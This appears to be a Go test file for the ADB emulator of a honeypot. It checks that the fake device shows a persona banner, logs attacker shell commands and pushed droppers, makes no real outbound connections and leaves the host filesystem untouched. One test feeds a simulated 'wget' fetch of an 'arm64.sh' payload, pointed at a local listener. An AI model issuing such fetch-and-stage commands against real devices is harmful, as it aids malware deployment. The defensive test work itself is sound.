package adb

import (
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"os"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"sweetty/internal/fakehost"
	"sweetty/internal/persona"
	"sweetty/internal/testharness"
)

func TestADBBannerMatchesPersona(t *testing.T) {
	h, p := setupADB(t)

	adbSend(t, h, "CNXN", adbVersion, adbMaxData, []byte("host::features=shell_v2,cmd,sync"))
	resp := adbRead(t, h)
	if resp.command != "CNXN" {
		t.Fatalf("first response command = %s, want CNXN", resp.command)
	}
	banner := string(resp.payload)
	for _, want := range []string{
		"device::",
		"ro.product.name=" + p.Hostname,
		"ro.product.model=" + p.Hostname,
		"ro.product.device=" + p.Hostname,
		"ro.product.cpu.abi=arm64-v8a",
	} {
		if !strings.Contains(banner, want) {
			t.Fatalf("ADB banner missing %q:\n%s", want, banner)
		}
	}
}

func TestADBShellCapturesKillChainWithoutDialing(t *testing.T) {
	h, p := setupADB(t)
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer ln.Close()
	var accepted int32
	go func() {
		for {
			c, err := ln.Accept()
			if err != nil {
				return
			}
			atomic.StoreInt32(&accepted, 1)
			c.Close()
		}
	}()
	url := "http://" + ln.Addr().String() + "/arm64.sh"
	cmd := "uname -a; wget " + url

	adbHandshake(t, h)
	adbSend(t, h, "OPEN", 1, 0, []byte("shell:"+cmd+"\x00"))

	okay := adbRead(t, h)
	if okay.command != "OKAY" || okay.arg1 != 1 {
		t.Fatalf("OPEN response = %+v, want OKAY for client stream 1", okay)
	}
	output := adbReadUntilClose(t, h)
	if !strings.Contains(output, p.Hostname) || !strings.Contains(output, p.KernelRel) {
		t.Fatalf("ADB shell output does not carry persona host/kernel:\n%s", output)
	}

	cmdEvent, ok := h.WaitEvent("COMMAND", 2*time.Second)
	if !ok {
		t.Fatal("ADB shell command was not logged")
	}
	if cmdEvent.Command != cmd || cmdEvent.Note != "adb-shell" {
		t.Fatalf("COMMAND event = command %q note %q, want %q / adb-shell", cmdEvent.Command, cmdEvent.Note, cmd)
	}
	dl, ok := h.WaitEvent("DOWNLOAD_ATTEMPT", 2*time.Second)
	if !ok {
		t.Fatal("ADB shell wget did not log DOWNLOAD_ATTEMPT")
	}
	if dl.URL != url {
		t.Fatalf("download URL = %q, want %q", dl.URL, url)
	}
	time.Sleep(200 * time.Millisecond)
	if atomic.LoadInt32(&accepted) != 0 {
		t.Fatal("ADB shell opened a real outbound connection")
	}
}

func TestADBSyncPushIsLoggedAsDropperAndHostUntouched(t *testing.T) {
	h, _ := setupADB(t)
	path := fmt.Sprintf("/tmp/sweetty_adb_canary_%d.sh", os.Getpid())
	payload := []byte("#!/system/bin/sh\nid\n")

	adbHandshake(t, h)
	adbSend(t, h, "OPEN", 7, 0, []byte("sync:\x00"))
	if okay := adbRead(t, h); okay.command != "OKAY" || okay.arg1 != 7 {
		t.Fatalf("sync OPEN response = %+v, want OKAY for client stream 7", okay)
	}
	adbSend(t, h, "WRTE", 7, 1, append(append(syncRecord("SEND", []byte(path+",0755")), syncRecord("DATA", payload)...), syncDone(1710000000)...))

	drop, ok := h.WaitEvent("DROPPER", 2*time.Second)
	if !ok {
		t.Fatal("ADB sync push did not log DROPPER")
	}
	if drop.Filename != path {
		t.Fatalf("dropper filename = %q, want %q", drop.Filename, path)
	}
	if drop.Command != "adb sync push" {
		t.Fatalf("dropper command = %q, want adb sync push", drop.Command)
	}
	if drop.Data != string(payload) {
		t.Fatalf("dropper data = %q, want %q", drop.Data, payload)
	}
	sum := sha256.Sum256(payload)
	if drop.SHA256 != hex.EncodeToString(sum[:]) {
		t.Fatalf("dropper sha = %q, want %x", drop.SHA256, sum)
	}
	if ack := adbRead(t, h); ack.command != "OKAY" || ack.arg1 != 7 {
		t.Fatalf("sync write ack = %+v, want OKAY for client stream 7", ack)
	}
	if closePkt := adbRead(t, h); closePkt.command != "CLSE" || closePkt.arg1 != 7 {
		t.Fatalf("sync close = %+v, want CLSE for client stream 7", closePkt)
	}
	if _, err := os.Stat(path); !os.IsNotExist(err) {
		t.Fatalf("ADB sync wrote to the real host path %q (err=%v)", path, err)
	}
}

func TestADBDropsMalformedPacketsWithoutCommandEvents(t *testing.T) {
	h, _ := setupADB(t)

	h.SendBytes(malformedADBPacket("CNXN", []byte("host::features=shell")))
	_ = h.ReadFor(200 * time.Millisecond)

	if _, ok := h.WaitEvent("ADB_MALFORMED", 2*time.Second); !ok {
		t.Fatal("malformed ADB packet was not logged")
	}
	if h.HasEvent("COMMAND") {
		t.Fatal("malformed ADB packet reached shell command handling")
	}
	if h.HasEvent("DROPPER") {
		t.Fatal("malformed ADB packet reached dropper handling")
	}
	if h.HasEvent("DOWNLOAD_ATTEMPT") {
		t.Fatal("malformed ADB packet reached download handling")
	}
}

func setupADB(t *testing.T) (*testharness.Harness, *persona.Persona) {
	t.Helper()
	p := persona.GenerateProfile("legacy")
	fs, err := fakehost.Load(p)
	if err != nil {
		t.Fatalf("load fakehost: %v", err)
	}
	h, err := testharness.New(New(fs, p))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(h.Close)
	return h, p
}

func adbHandshake(t *testing.T, h *testharness.Harness) adbPacket {
	t.Helper()
	adbSend(t, h, "CNXN", adbVersion, adbMaxData, []byte("host::features=shell_v2,cmd,sync"))
	resp := adbRead(t, h)
	if resp.command != "CNXN" {
		t.Fatalf("handshake response command = %s, want CNXN", resp.command)
	}
	return resp
}

type adbPacket struct {
	command string
	arg0    uint32
	arg1    uint32
	payload []byte
}

func adbSend(t *testing.T, h *testharness.Harness, cmd string, arg0, arg1 uint32, payload []byte) {
	t.Helper()
	h.SendBytes(encodeADBPacket(cmd, arg0, arg1, payload))
}

func adbRead(t *testing.T, h *testharness.Harness) adbPacket {
	t.Helper()
	h.Client.SetReadDeadline(time.Now().Add(2 * time.Second))
	var header [24]byte
	if _, err := io.ReadFull(h.Client, header[:]); err != nil {
		t.Fatalf("read ADB header: %v", err)
	}
	length := binary.LittleEndian.Uint32(header[12:16])
	if length > 1<<20 {
		t.Fatalf("server sent oversized ADB payload length %d", length)
	}
	payload := make([]byte, length)
	if _, err := io.ReadFull(h.Client, payload); err != nil {
		t.Fatalf("read ADB payload: %v", err)
	}
	command := string(header[:4])
	if got, want := binary.LittleEndian.Uint32(header[20:24]), commandValue(command)^0xffffffff; got != want {
		t.Fatalf("server packet %s magic = %#x, want %#x", command, got, want)
	}
	if got, want := binary.LittleEndian.Uint32(header[16:20]), checksum(payload); got != want {
		t.Fatalf("server packet %s checksum = %#x, want %#x", command, got, want)
	}
	return adbPacket{
		command: command,
		arg0:    binary.LittleEndian.Uint32(header[4:8]),
		arg1:    binary.LittleEndian.Uint32(header[8:12]),
		payload: payload,
	}
}

func adbReadUntilClose(t *testing.T, h *testharness.Harness) string {
	t.Helper()
	var out strings.Builder
	for {
		pkt := adbRead(t, h)
		switch pkt.command {
		case "WRTE":
			out.Write(pkt.payload)
			adbSend(t, h, "OKAY", pkt.arg1, pkt.arg0, nil)
		case "CLSE":
			return out.String()
		default:
			t.Fatalf("unexpected packet while reading stream: %+v", pkt)
		}
	}
}

func encodeADBPacket(cmd string, arg0, arg1 uint32, payload []byte) []byte {
	if len(cmd) != 4 {
		panic("ADB command must be four bytes")
	}
	out := make([]byte, 24+len(payload))
	copy(out[:4], cmd)
	binary.LittleEndian.PutUint32(out[4:8], arg0)
	binary.LittleEndian.PutUint32(out[8:12], arg1)
	binary.LittleEndian.PutUint32(out[12:16], uint32(len(payload)))
	binary.LittleEndian.PutUint32(out[16:20], checksum(payload))
	binary.LittleEndian.PutUint32(out[20:24], commandValue(cmd)^0xffffffff)
	copy(out[24:], payload)
	return out
}

func malformedADBPacket(cmd string, payload []byte) []byte {
	pkt := encodeADBPacket(cmd, 0, 0, payload)
	binary.LittleEndian.PutUint32(pkt[20:24], 0)
	return pkt
}

func syncRecord(id string, data []byte) []byte {
	if len(id) != 4 {
		panic("sync id must be four bytes")
	}
	out := make([]byte, 8+len(data))
	copy(out[:4], id)
	binary.LittleEndian.PutUint32(out[4:8], uint32(len(data)))
	copy(out[8:], data)
	return out
}

func syncDone(mtime uint32) []byte {
	out := make([]byte, 8)
	copy(out[:4], "DONE")
	binary.LittleEndian.PutUint32(out[4:8], mtime)
	return out
}
